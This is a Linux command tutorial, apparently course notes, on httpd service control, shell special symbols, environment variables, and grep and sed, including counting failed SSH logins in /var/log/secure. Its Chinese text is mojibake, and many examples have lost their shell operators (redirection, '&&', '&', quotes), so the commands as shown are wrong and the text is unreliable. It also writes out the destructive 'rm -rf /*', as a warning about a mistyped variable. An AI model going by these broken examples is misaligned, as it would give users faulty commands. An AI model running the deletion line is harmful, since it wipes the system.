httpd.service 2.20.2 é‡å¯æœåŠ¡systemctl restart httpd 2.20.3 å¯åŠ¨æœåŠ¡systemctl start httpd #startå¯åŠ¨ æˆ–è€… systemctl start httpd.serviceps -ef|grep httpd ## å¯ä»¥çœ‹åˆ°æœåŠ¡è¿›ç¨‹ï¼Œè¡¨ç¤ºå¯åŠ¨äº† 2.20.4 åœæ­¢æœåŠ¡systemctl stop httpd #stopåœæ­¢ 2.20.5 æŸ¥çœ‹æœåŠ¡çŠ¶æ€## æŸ¥çœ‹æœåŠ¡çŠ¶æ€systemctl status httpd #æŸ¥çœ‹æœåŠ¡çŠ¶æ€ httpdæ˜¯ä¸€ä¸ªç½‘ç«™æœåŠ¡è½¯ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡æµè§ˆå™¨è®¿é—®ï¼š å¹¶ä¸”å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸ªç½‘ç«™ä»£ç ï¼Œä¸Šä¼ åˆ°ä¸€ä¸ªç‰¹å®šç›®å½• varwwwhtml ç›®å½•ä¸‹é¢ï¼š è§£å‹ï¼š [root@localhost html]# tar zxf youxi.tar.gz [root@localhost html]# lsyouxi youxi.tar.gz[root@localhost html]# ls youxiceshi games icon index index0 index1 index2 index3 index4 index5 index.html[root@localhost html]# è®¿é—®ï¼š å°±å¯ä»¥ç©æ¸¸æˆäº†ã€‚ 2.21 Linuxç‰¹æ®Šç¬¦å·2.21.1 #å·#å·ï¼šæ³¨é‡Šã€å¤‡æ³¨ã€æ‰¹æ³¨ï¼Œç³»ç»Ÿè‡ªåŠ¨å¿½ç•¥ï¼Œä¸æ‰§è¡Œã€‚ [root@localhost ~]# sdddddddddddddddddddddddddddddddddddddddd -bash: sdddddddddddddddddddddddddddddddddddddddd: æœªæ‰¾åˆ°å‘½ä»¤ [root@localhost ~]# [root@localhost ~]# # sdddddddddddddddddddddddddddddddddddddddd # è¿™å°±ä¸æŠ¥é”™äº†ï¼Œå› ä¸ºç³»ç»Ÿä¸æ‰§è¡Œè¢«#å·æ³¨é‡Šçš„å†…å®¹ # åœ¨linuxç³»ç»Ÿä¸Šçš„æŒ‡ä»¤å’Œé…ç½®æ˜¯é€šè¿‡#å·æ³¨é‡Šçš„ï¼Œè€Œå¼€å‘ä¸­ï¼Œç¼–ç¨‹è¯­è¨€é‡Œé¢ä¸åŒçš„è¯­è¨€ä¹Ÿæœ‰ä¸åŒçš„æ³¨é‡Šå·ï¼Œæ¯”å¦‚//ã€æ³¨é‡Šå†…å®¹ã€#ã€/**/ç­‰ç­‰ 2.21.2 shellå‘½ä»¤ä¸­çš„å…¶ä»–ç¬¦å·2-1 ;å‘½ä»¤çš„åˆ†éš”ç¬¦## ;å‘½ä»¤çš„åˆ†éš”ç¬¦ï¼Œé€šè¿‡å®ƒå¯ä»¥è¿æ¥å¤šæ¡æŒ‡ä»¤ï¼Œä¸€èµ·æ‰§è¡Œ [root@localhost ~]# touch 111.txt;chmod 777 111.txt [root@localhost ~]# ll 111.txt -rwxrwxrwx 1 root root 0 9æœˆ 12 04:40 111.txt 2-2 ..ä»£è¡¨ä¸Šçº§ç›®å½•[root@localhost ~]# pwd/root[root@localhost ~]# cd ..[root@localhost /]# pwd/# cd ../../../../../../../../ï¼Œå½“..å¾ˆå¤šæ—¶ï¼Œå°±ä¼šåˆ°æ ¹ç›®å½•/ 2-3 .ä»£è¡¨å½“å‰ç›®å½•[root@localhost opt]# cp /data/man_db.conf .[root@localhost opt]# lsman_db.conf 2-4 å˜é‡å’Œå¸¸é‡ ## å˜é‡ï¼Œå€¼æ˜¯ä¸å›ºå®šçš„ï¼Œæ¯”å¦‚ï¼šæˆ‘çš„å¥³æœ‹å‹=xxxï¼Œè¿™ä¸ªxxxä¸æ˜¯å›ºå®šçš„ã€‚æˆ‘çš„å¥³æœ‹å‹å°±æ˜¯å˜é‡ã€‚åˆ«äººè®°ä¸ä½ä½ å¯¹è±¡åå­—çš„æ—¶å€™ï¼Œå°±è¿™ä¹ˆé—®ï¼Œä½ å¯¹è±¡å‘¢ï¼Ÿè€Œä¸æ˜¯ç›´å‘¼å…¶åã€‚ ## å¸¸é‡ï¼Œå€¼æ˜¯å›ºå®šã€‚åœ†å‘¨ç‡=3.1415926...ï¼Œå›ºå®šçš„å€¼ï¼Œä¸ä¼šå˜ã€‚ ## envå‘½ä»¤å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿå†…ç½®çš„ç¯å¢ƒå˜é‡ï¼šå’Œwindowsçš„ç¯å¢ƒå˜é‡ç±»ä¼¼ã€‚ç³»ç»Ÿå˜é‡å°±æ˜¯è®©ä¸€äº›åœ¨è°ƒç”¨çš„æ—¶å€™æ¯”è¾ƒéº»çƒ¦æˆ–è€…è¯´å¯»æ‰¾çš„æ—¶å€™è·¯å¾„æ¯”è¾ƒé•¿çš„åŠŸèƒ½å˜å¾—ç®€å•åŒ–ã€‚ç³»ç»Ÿå†…éƒ¨å¤„ç†æ—¶ï¼Œä¼šæ ¹æ®å˜é‡çš„å€¼åšå‡ºä¸åŒçš„ååº”ã€‚ [root@localhost ~]# env XDG_SESSION_ID=1 HOSTNAME=localhost.localdomain # å˜é‡ä½œç”¨ï¼šæ¯”å¦‚HOSTNAMEè¿™ä¸ªå˜é‡ï¼Œå®ƒçš„å€¼æ¯”è¾ƒé•¿ï¼Œ ##ç³»ç»Ÿå†…éƒ¨ç¨‹åºä¼šç»å¸¸ç”¨åˆ°è¿™ä¸ªå€¼ï¼Œé‚£ä¹ˆç”¨ä¸€ä¸ªå˜é‡å­˜æ”¾ï¼Œä»¥åæƒ³ç”¨è¿™ä¸ªå€¼ï¼Œå°±ç”¨è¿™ä¸ªå˜é‡å³å¯ï¼Œç®€å•å¾ˆå¤šï¼Œè€Œä¸”åªè¦ä¿®æ”¹äº†è¿™ä¸ªå€¼ï¼Œå…¶ä»–ä½¿ç”¨è¿™ä¸ªå˜é‡çš„åœ°æ–¹ï¼Œå€¼éƒ½ä¼šè·Ÿç€å˜åŒ–ï¼Œæ–¹ä¾¿ä¿®æ”¹ã€‚ TERM=xterm SHELL=/bin/bash HISTSIZE=1000 # è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå†å²å‘½ä»¤åªè®°å½•1000çš„åŸå› ã€‚ SSH_CLIENT=192.168.61.1 50670 22 SSH_TTY=/dev/pts/0 USER=root # å½“å‰ç™»å½•ç”¨æˆ·ï¼Œå…¶ä»–ç”¨æˆ·ç™»å½•çš„æ—¶å€™ï¼Œè¿™ä¸ªå˜é‡å¯¹åº”çš„å€¼å°±å˜ä¸ºäº†å…¶ä»–ç”¨æˆ·å LANG=zh_CN.UTF-8 # languageçš„ç®€å†™ï¼Œè£…ç³»ç»Ÿçš„æ—¶å€™ï¼Œä½ å®‰è£…çš„è‹±æ–‡ï¼Œè¿™é‡Œå°±æ˜¯en_USï¼Œä¸­æ–‡å°±æ˜¯zh_CN # æŸ¥çœ‹æŸä¸ªå˜é‡çš„å€¼ $ç¬¦å·+å˜é‡åç§°ï¼š [root@localhost ~]# echo $LANG zh_CN.UTF-8 # æˆ‘ä»¬æ”¹ä¸€ä¸‹è¯­è¨€å˜é‡ï¼Œæ¥çœ‹çœ‹æ•ˆæœï¼Œæ¯”å¦‚ä¹‹å‰å‘½ä»¤çš„å‚æ•°ä»‹ç»éƒ½æ˜¯ä¸­æ–‡çš„,exportç”¨æ¥å£°æ˜ç¯å¢ƒå˜é‡ã€ä¿®æ”¹ç¯å¢ƒå˜é‡ç­‰ï¼Œå¦‚ä¸‹ï¼š [root@localhost ~]# usermod --help ç”¨æ³•ï¼šusermod [é€‰é¡¹] ç™»å½• é€‰é¡¹ï¼š -c, --comment æ³¨é‡Š GECOS å­—æ®µçš„æ–°å€¼ -d, --home HOME_DIR ç”¨æˆ·çš„æ–°ä¸»ç›®å½• [root@localhost ~]# export LANG=en_US.UTF-8 [root@localhost ~]# usermod --help # å…¨éƒ¨å˜è‹±æ–‡äº† Usage: usermod [options] LOGIN Options: -c, --comment COMMENT new value of the GECOS field -d, --home HOME_DIR new home directory for the user account # ä¹Ÿå°±æ˜¯è¯´ï¼Œæ”¹åŠ¨ç¯å¢ƒå˜é‡ï¼Œä¼šå¯¹ç³»ç»Ÿæœ‰å½±å“ï¼Œå› ä¸ºç³»ç»Ÿä¸­ä½¿ç”¨è¿™ä¸ªå˜é‡çš„åŠŸèƒ½éƒ½ä¼šéšç€å˜é‡çš„å€¼è€Œåšä¸åŒçš„å¤„ç†ã€‚ 2-5 â€œâ€åŒå¼•å·ï¼Œæ¢è¡Œï¼Œè§£æå˜é‡## æ¯”å¦‚ï¼šechoï¼Œæœ¬æ¥åªèƒ½è¾“å‡ºå•è¡Œæ–‡æœ¬å†…å®¹ï¼ŒåŠ ä¸ŠåŒå¼•å·æ”¯æŒæ¢è¡Œè¾“å…¥å’Œè¾“å‡º [root@localhost ~]# echo hello hello [root@localhost ~]# echo hello jaden hello jaden [root@localhost ~]# echo hello jaden jaden.txt # è¿˜å¯ä»¥è¾“å‡ºåˆ°æŸä¸ªæ–‡ä»¶ä¸­ [root@localhost ~]# cat jaden.txt hello jaden ## æœ‰æ—¶å€™æ¯”viç”¨èµ·æ¥æ–¹ä¾¿ã€‚ # èƒ½å¤Ÿè§£æå˜é‡ï¼Œå¦‚ä¸‹ [root@localhost ~]# echo $LANG en_US.UTF-8 2-6 â€˜â€™å•å¼•å·ï¼Œæ¢è¡Œï¼Œä¸è§£æå˜é‡# å•å¼•å·ä¸èƒ½è§£æå˜é‡ï¼Œå…¶ä»–åŠŸèƒ½å’ŒåŒå¼•å·ç±»ä¼¼ï¼Œå¦‚ä¸‹ [root@localhost ~]# echo $LANG $LANG 2-7 \\å’Œ# \\ è½¬ä¹‰ç¬¦ï¼Œåæ–œæ ## / è·¯å¾„åˆ†éš”ç¬¦ 2-8 !## å†å²å‘½ä»¤è°ƒç”¨ï¼Œåœ¨findå‘½ä»¤ä¸­æ˜¯å–åçš„æ„æ€ã€‚[root@localhost ~]# history [root@localhost ~]# !47 # è°ƒç”¨å†å²æŒ‡ä»¤147å· 2-9 * é€šé…ç¬¦## æˆ‘ä»¬å°†findçš„ä¹‹åç”¨åˆ°è¿‡ï¼Œå¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ [root@localhost ~]# ls *.txt # æŸ¥çœ‹æ‰€æœ‰.txtç»“å°¾çš„æ–‡ä»¶ jaden.txt 2-10 $ è°ƒç”¨å˜é‡ [root@localhost ~]# export LANG=en_US.UTF-8 [root@localhost ~]# echo $LANG en_US.UTF-8 [root@localhost ~]# stat 111.txt File: â€˜111.txtâ€™ Size: 0 Blocks: 0 IO Block: 4096 regular empty file Device: fd00h/64768d Inode: 33575641 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2021-09-12 04:40:28.399177386 +0800 Modify: 2021-09-12 04:40:28.399177386 +0800 Change: 2021-09-12 04:40:28.400260737 +0800 Birth: - [root@localhost ~]# export LANG=zh_CN.UTF-8 [root@localhost ~]# stat 111.txt æ–‡ä»¶ï¼š111.txt å¤§å°ï¼š0 å—ï¼š0 IO å—ï¼š4096 æ™®é€šç©ºæ–‡ä»¶ è®¾å¤‡ï¼šfd00h/64768d Inodeï¼š33575641 ç¡¬é“¾æ¥ï¼š1 æƒé™ï¼š(0777/-rwxrwxrwx) Uidï¼š( 0/ root) Gidï¼š( 0/ root) æœ€è¿‘è®¿é—®ï¼š2021-09-12 04:40:28.399177386 +0800 æœ€è¿‘æ›´æ”¹ï¼š2021-09-12 04:40:28.399177386 +0800 æœ€è¿‘æ”¹åŠ¨ï¼š2021-09-12 04:40:28.400260737 +0800 åˆ›å»ºæ—¶é—´ï¼š- # è¿˜æœ‰å¾ˆå¤šæŒ‡ä»¤çš„å¸®åŠ©ä¿¡æ¯å³ä¾¿è®¾ç½®äº†ä¸­æ–‡ï¼Œå®ƒçš„å¸®åŠ©ä¿¡æ¯éƒ½æ˜¯è‹±æ–‡ï¼Œæ¯”å¦‚curl [root@localhost ~]# curl --help# å› ä¸ºæ±‰åŒ–è¿™ä¸ªäº‹æƒ…ï¼Œæ˜¯å¥½å¤šäººåšçš„ï¼Œè€Œä¸”è¦åšå¾ˆä¹…ï¼Œä½†æ˜¯ç³»ç»Ÿè¿˜ä¼šæ›´æ–°ï¼Œè¿˜æ²¡æ±‰åŒ–å®Œï¼Œå°±åˆæ›´æ–°ç³»ç»Ÿäº†ï¼Œè¿˜éœ€é‡æ–°æ±‰åŒ–ï¼Œæ‰€ä»¥è¿™æ ·ä¸åˆ’ç®—ï¼Œæ±‰åŒ–ç»„å°±è§£æ•£äº†ï¼Œæ‰€ä»¥æœ‰äº›æŒ‡ä»¤å°±ä¸æ±‰åŒ–äº†ã€‚è€Œä¸”æœ‰æ—¶å€™æ±‰åŒ–å‡ºæ¥çš„æ„æ€å’Œè‹±è¯­æœ¬æ¥çš„æ„æ€ä¸åŒï¼Œå› ä¸ºå‚ä¸æ±‰åŒ–çš„äººæœ‰äº›ä¸æ˜¯è®¡ç®—æœºä¸“ä¸šçš„ï¼Œè¿™å°±å¾ˆå°´å°¬ã€‚ # ä½¿ç”¨å˜é‡çš„æ—¶å€™è¦å°å¿ƒï¼Œæ¯”å¦‚æœ‰äº›äººæ“ä½œå˜é‡çš„æ—¶å€™ï¼Œåˆ é™¤äº†æ ¹ç›®å½•ï¼Œå¦‚ä¸‹ [root@localhost ~]# jaden=/tmp # å®šä¹‰å˜é‡ [root@localhost ~]# echo $jaden # æŸ¥çœ‹å˜é‡å€¼ /tmp [root@localhost ~]# rm -rf $jaden/* # åˆ©ç”¨å˜é‡åšåˆ é™¤ï¼Œè¿™æ˜¯åˆ é™¤/tmpç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹ # ï¼ï¼ï¼ä½†æ˜¯ï¼Œå¦‚æœå˜é‡åå†™é”™äº†ï¼Œå¦‚ä¸‹ [root@localhost ~]# rm -rf $jadn/* # å°‘å†™äº†ä¸ªeå­—æ¯ï¼Œç³»ç»Ÿåšåˆ é™¤çš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°è¿™ä¸ªå˜é‡ï¼Œé‚£ä¹ˆä¼šå˜æˆå¦‚ä¸‹æ•ˆæœ [root@localhost ~]# rm -rf /* # å°±åˆ é™¤æ ¹ç›®å½•äº†ï¼ï¼ï¼ï¼ï¼ç³»ç»Ÿå´©æºƒäº†å°±ã€‚æ‰€ä»¥çœ‹åˆ°åˆ é™¤å‘½ä»¤ï¼Œå°±ä¸€å®šè¦ç‰¹åˆ«çš„å°å¿ƒã€‚ 2-11 , , , ## è¾“å‡ºé‡å®šå‘## è¿½åŠ è¾“å‡ºé‡å®šå‘## è¾“å…¥é‡æ–°å®šå‘## è¿½åŠ è¾“å…¥é‡å®šå‘ 2-12 ç®¡é“ |2-13 ||# ç¬¬ä¸€ä¸ªå‘½ä»¤å¤±è´¥ï¼Œæ‰æ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤ï¼Œç¬¬ä¸€ä¸ªæŒ‡ä»¤æˆåŠŸäº†ï¼Œä¸ä¼šæ‰§è¡Œç¬¬äºŒä¸ªæŒ‡ä»¤ # æŒ‡ä»¤è¿æ¥ç¬¦å·ï¼Œä¹‹å‰è¯´è¿‡; é™¤äº†å®ƒï¼Œè¿˜æœ‰ || å’Œ ï¼Œåˆ†å·æ˜¯ä¸¤ä¸ªæŒ‡ä»¤éƒ½ä¼šæ‰§è¡Œï¼Œå“ªä¸ªå‡ºé”™éƒ½ä¸å½±å“å…¶ä»–çš„æŒ‡ä»¤ã€‚ [root@localhost ~]# echo 123 || ls 123 [root@localhost ~]# ech 123 || ls -bash: ech: command not found anaconda-ks.cfg jaden.txt 2-14 # å’Œï¼Œä¸¤ä¸ªä¸€èµ·æ‰§è¡Œï¼Œå¦‚æœç¬¬ä¸€ä¸ªå¤±è´¥äº†ï¼Œä¸¤ä¸ªéƒ½ä¸æ‰§è¡Œï¼Œå¦‚æœç¬¬ä¸€ä¸ªæˆåŠŸäº†ï¼Œç¬¬äºŒä¸ªå¤±è´¥äº†ï¼Œå°±æ‰§è¡Œç¬¬ä¸€ä¸ªï¼Œå¦‚æœä¸¤ä¸ªéƒ½æˆåŠŸäº†ï¼Œå°±éƒ½æ‰§è¡Œã€‚ [root@localhost ~]# echo 123 ls 123 anaconda-ks.cfg jaden.txt [root@localhost ~]# ech 123 ls -bash: ech: command not found [root@localhost ~]# echo 123 lx 123 -bash: lx: command not foun 2-15 # åå°è¿è¡Œ # æ¯”å¦‚topæŒ‡ä»¤ï¼Œä¹‹å‰è¿è¡Œtopï¼Œä¼šå ä½ç»ˆç«¯ï¼Œé™¤éç»“æŸtopï¼Œä¸ç„¶ä¸èƒ½æ‰§è¡Œå…¶ä»–æŒ‡ä»¤ [root@localhost ~]# top [1] 16567 [root@localhost ~]# ps -ef |grep top root 16567 1467 0 16:56 pts/0 00:00:00 top root 16569 1467 0 16:57 pts/0 00:00:00 grep --color=auto top 2-16 ~## ä»£è¡¨å®¶ç›®å½•ï¼Œä¸åŒçš„ç”¨æˆ·å®¶ç›®å½•ä¸åŒã€‚ [root@localhost ~]# cd /tmp/ [root@localhost tmp]# cd ~ [root@localhost ~]# cd /tmp [root@localhost tmp]# cd # å…¶å®cdä»€ä¹ˆå‚æ•°éƒ½ä¸åŠ ï¼Œä¹Ÿæ˜¯å›åˆ°å®¶ç›®å½• [root@localhost ~]# 2-17 åå¼•å· # ç”¨æ¥åµŒå¥—å‘½ä»¤ï¼Œåå¼•å·ä¸­çš„å‘½ä»¤å…ˆæ‰§è¡Œ ä¾‹å­1ï¼š [root@localhost ~]# mkdir `echo jaden` [root@localhost ~]# ls anaconda-ks.cfg jaden jaden.txt ä¾‹å­2ï¼š [root@localhost opt]# touch test_`date +%T`.txt [root@localhost opt]# ls test_04\\:56\\:22.txt test_04:56:22.txt ä¾‹å­3ï¼š [root@localhost ~]# tar zcf /tmp/etc.tar.gz `find /etc -type f -name *.conf` tar: Removing leading `/ from member names [root@localhost ~]# ls /tmp/ etc.tar.gz [root@localhost ~]# tar tf /tmp/etc.tar.gz # æŸ¥çœ‹å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶å†…å®¹ 2.22 ä¸‰å‰‘å®¢## ä¸‰å‰‘å®¢å°±æ˜¯ä¸‰ä¸ªå¼ºå¤§çš„å‘½ä»¤ã€‚åæœŸè®²åº”æ€¥æº¯æºçš„æ—¶å€™ä¼šç”¨åˆ°ã€‚grepç”¨çš„æœ€å¤šï¼Œæ‰€ä»¥æˆ‘ä»¬é‡ç‚¹è®²è§£è¿™ä¸ªæŒ‡ä»¤ã€‚ä¸‰å‰‘å®¢é…åˆæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å‘æŒ¥å¾ˆç‰›çš„ä½œç”¨ã€‚ 2.22.1 grep#æ“…é•¿è¿‡æ»¤ï¼Œæˆ–è€…è¯´æŸ¥æ‰¾ï¼ŒæŒ‰è¡Œæ¥è¿‡æ»¤## ä¾‹å­ï¼š/var/log/secureæ˜¯è®°å½•ç”¨æˆ·ç™»å½•ç³»ç»Ÿçš„è¡Œä¸ºçš„ï¼Œç™»å½•æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œç³»ç»Ÿéƒ½ä¼šè‡ªåŠ¨è®°å½•è¿™æ¬¡ç™»å½•åŠ¨ä½œã€‚ [root@localhost ~]# grep Failed password /var/log/secure Mar 25 18:20:48 localhost sshd[16905]: Failed password for root from 192.168.61.1 port 55577 ssh2 # å¦‚æœæˆ‘ä»¬æƒ³å°†æ‰€æœ‰ç™»å½•å¤±è´¥çš„ipåœ°å€æ‰¾å‡ºæ¥ï¼Œå¯ä»¥å†æ¬¡è¿‡æ»¤# æ¯”å¦‚æŸ¥çœ‹æŸä¸ªipåœ°å€ç™»å½•äº†å¤šå°‘æ¬¡[root@localhost ~]# grep Failed password /var/log/secure|grep 192.168.61.1 |wc -l 3# å¯ä»¥å€ŸåŠ©æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥å°†å†…å®¹è¿‡æ»¤çš„å¾ˆç²¾ç¡®ï¼Œæœ‰äº›åœ¨çº¿çš„ç½‘ç«™ä¹Ÿå¯ä»¥å¸®æˆ‘ä»¬ç”Ÿæˆä¸€äº›å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ¯”å¦‚https://www.hake.cc/tools/regexcode/ [root@localhost ~]# grep Failed password /var/log/secure|grep --color -P (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\. (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d) Mar 25 18:20:48 localhost sshd[16905]: Failed password for root from 192.168.61.1 port 55577 ssh2# ipåœ°å€éƒ½æ ‡çº¢è‰²äº†ï¼Œè¡¨ç¤ºåŒ¹é…å‡ºæ¥äº†ã€‚# å¦‚æœåªè¦ipåœ°å€-Po [root@localhost ~]# grep Failed password /var/log/secure|grep --color -Po (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\. (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d) 192.168.61.1 # æœ‰äº›ipåœ°å€æ˜¯é‡å¤çš„ï¼Œå› ä¸ºå°è¯•ç™»å½•äº†å¾ˆå¤šæ¬¡ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæ’åºï¼Œå†å»é‡ï¼Œæ¥æŸ¥çœ‹ipåœ°å€[root@localhost ~]# grep Failed password /var/log/secure|grep --color -Po (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d) |sort -n |uniq -c 2 192.168.2.113 3 192.168.2.116 1 192.168.61.1# æ¯”å¦‚ï¼Œå¦‚æœçœ‹åˆ°äº†è¿™ä¹ˆä¸ªipåœ°å€164.90.232.121ã€164.90.232.241ç­‰å°è¯•ç™»å½•äº†ä½ ä¸Šåƒä¸Šä¸‡æ¬¡ï¼Œå°±æ˜¯åœ¨çˆ†ç ´æ”»å‡»æˆ‘ä»¬ï¼Œç™¾åº¦ä¸€æŸ¥ï¼Œå¾·å›½çš„# æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹‰é»‘è¿™ä¸ªipåœ°å€ï¼Œä¹Ÿå«åšåŠ é»‘ï¼ŒåŠ å…¥é»‘åå•çš„æ„æ€ï¼Œè¿™ä¸ªç­‰åé¢æˆ‘å†æ•™å¤§å®¶ã€‚# ä¸ºäº†æ¼”ç¤ºä¸‹é¢çš„å‚æ•°ï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªç¤ºä¾‹ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç»ƒä¹ æ–‡ä»¶ï¼š [root@localhost log]# cd /root/ [root@localhost ~]# head -50 /etc/services test.txt [root@localhost ~]# ls2.txt anaconda-ks.cfg jaden jaden17:52:30.txt jaden.txt test.txt xx.txt #grepå‚æ•°## -n æ˜¾ç¤ºè¡Œå· [root@localhost ~]# grep -n tcp test.txt # vi test.txt +48ï¼Œè¡¨ç¤ºè¿›å…¥viçš„æ—¶å€™ï¼Œå…‰æ ‡ç›´æ¥å®šä½çš„48è¡Œèµ·å§‹ä½ç½®ã€‚## -c å¯¹ç»“æœè¡Œè®¡æ•° [root@localhost ~]# grep -c tcp test.txt 14## -i ä¸åŒºåˆ†å¤§å°å†™ [root@localhost ~]# grep -n tcp test.txt -i ## -v åå‘æœç´¢ï¼Œå–å [root@localhost ~]# grep -n udp test.txt -v # å°†ä¸å«æœ‰udpçš„è¡Œå…¨éƒ¨è¿‡æ»¤å‡ºæ¥ ## -w ç²¾å‡†åŒ¹é… [root@localhost ~]# grep -w tcp test.txt ##-o åªæ˜¾ç¤ºåŒ¹é…çš„ç»“æœï¼Œå‰é¢çš„ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­æˆ‘ä»¬ç”¨è¿‡-oå‚æ•° [root@localhost ~]# grep -o -n tcp test.txt ## -A1 åŒæ—¶æ‰“å°æœç´¢ç»“æœè¡Œçš„åä¸€è¡Œ ï¼ŒAæ˜¯afterçš„ç®€å†™ [root@localhost ~]# grep -A2 ftp test.txt [root@localhost ~]# grep -A 2 ftp test.txt ## -B3 åŒæ—¶æ‰“å°æœç´¢ç»“æœè¡Œçš„å‰ä¸‰è¡Œï¼ŒBæ˜¯beforeçš„ç®€å†™ [root@localhost ~]# grep -B2 ftp test.txt ## -C2 åŒæ—¶æ‰“å°æœç´¢ç»“æœè¡Œçš„ä¸Šä¸‹å„ä¸¤è¡Œ [root@localhost ~]# grep -C2 ftp test.txt ## -E æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ # æ­£åˆ™æˆ‘ä»¬ä¸‹é¢ä¼šç»†è®²ï¼Œå…ˆç®€å•äº†è§£ä¸€ä¸‹ã€‚ [root@localhost ~]# grep -E .tp test.txt # .å°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºä»»æ„çš„ä¸€ä¸ªå­—ç¬¦ [root@localhost ~]# grep -E ftp|ssh test.txt # æŸ¥æ‰¾ftpæˆ–è€…sshï¼Œ|æ˜¯æˆ–è€…çš„æ„æ€ï¼Œå¯ä»¥ç”¨å¤šä¸ªftp|ssh|telnet... ## -P ä½¿ç”¨perlæ­£åˆ™ # perlè¯­è¨€ä¸­è®¾è®¡çš„æ­£åˆ™è¡¨è¾¾å¼å†™æ³•è§„åˆ™ï¼Œå¾ˆå¼ºå¤§ï¼Œå¾ˆå¤šé¢†åŸŸéƒ½æ”¯æŒperlæ­£åˆ™çš„è¯­æ³•ç»“æ„ã€‚ [root@localhost ~]# grep -P \\d+ test.txt # åŒ¹é…æ‰€æœ‰çš„æ•°å­— [root@localhost ~]# grep -P \\d4, test.txt #åŒ¹é…4ä½çš„æ•°å­— 2.22.2 sed#æ“…é•¿å–è¡Œå’Œä¿®æ”¹æ›¿æ¢## ç”¨æ³•ï¼šsed [-nri] [åŠ¨ä½œ] ç›®æ ‡æ–‡ä»¶æ–‡ä»¶## é€‰é¡¹ä¸å‚æ•°ï¼š-n ï¼š ##ä½¿ç”¨å®‰é™(silent)æ¨¡å¼ã€‚åœ¨ä¸€èˆ¬ sed çš„ç”¨æ³•ä¸­ï¼Œæ‰€æœ‰æ¥è‡ª STDIN çš„æ•°æ®ä¸€èˆ¬éƒ½ä¼šè¢«åˆ—å‡ºåˆ°ç»ˆç«¯ä¸Šã€‚ä½†å¦‚æœåŠ ä¸Š -n å‚æ•°åï¼Œåˆ™åªæœ‰ç»è¿‡sed ç‰¹æ®Šå¤„ç†çš„é‚£ä¸€è¡Œ(æˆ–è€…åŠ¨ä½œ)æ‰ä¼šè¢«åˆ—å‡ºæ¥ã€‚-r ï¼š## sed çš„åŠ¨ä½œæ”¯æŒçš„æ˜¯å»¶ä¼¸å‹æ­£åˆ™è¡¨ç¤ºæ³•çš„è¯­æ³•ã€‚(é»˜è®¤æ˜¯åŸºç¡€æ­£åˆ™è¡¨ç¤ºæ³•è¯­æ³•)-i ï¼š## ç›´æ¥ä¿®æ”¹è¯»å–çš„æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ˜¯è¾“å‡ºåˆ°ç»ˆç«¯ã€‚åŠ¨ä½œè¯´æ˜ï¼š [n1[,n2]]function n1, n2ä¸€èˆ¬è¡¨ç¤ºä¸ºè¡Œå·ï¼Œ[,n2]è¡¨ç¤ºè¿™ä¸ªå‚æ•°å¯é€‰ï¼Œå¯æœ‰å¯æ— ã€‚functionï¼š a ï¼š## æŒ‡å®šè¡Œåé¢æ’å…¥ä¸€è¡Œ d ï¼š## åˆ é™¤ i ï¼š## æŒ‡å®šè¡Œå‰é¢æ’å…¥ä¸€è¡Œ p ï¼š## æ‰“å°ï¼Œä¸€èˆ¬å’Œå‰é¢çš„-nå‚æ•°ä¸€èµ·ç”¨ s ï¼š## æ›¿æ¢ éœ€è¦Iå¿½ç•¥å¤§å°å†™ï¼Œå…¨å±€æ›¿æ¢éœ€è¦gsedè¿‡æ»¤ # sedä¹Ÿå¯ä»¥è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚ä¸‹ç®€å•ç¤ºä¾‹ [root@localhost ~]# seq 5 1.txt [root@localhost ~]# vi 1.txt # ä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ [root@localhost ~]# cat 1.txt 1 2c 3a 4b 5a [root@localhost ~]# sed /a/p 1.txt #é»˜è®¤ä¼šå°†æ‰€æœ‰è¡Œéƒ½æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”åŒ¹é…åˆ°çš„aæ‰€åœ¨çš„è¡Œé‡æ–°æ‰“å°ä¸€é 1 2c 3a 3a 4b 5a 5a [root@localhost ~]# sed -n /a/p 1.txt # åŠ ä¸Š-nï¼Œè¿›å…¥å®‰é™(silent)æ¨¡å¼ï¼Œå°±ä¸ä¼šå°†æ‰€æœ‰å†…å®¹æ‰“å°å‡ºæ¥äº†ã€‚ 3a 5a # 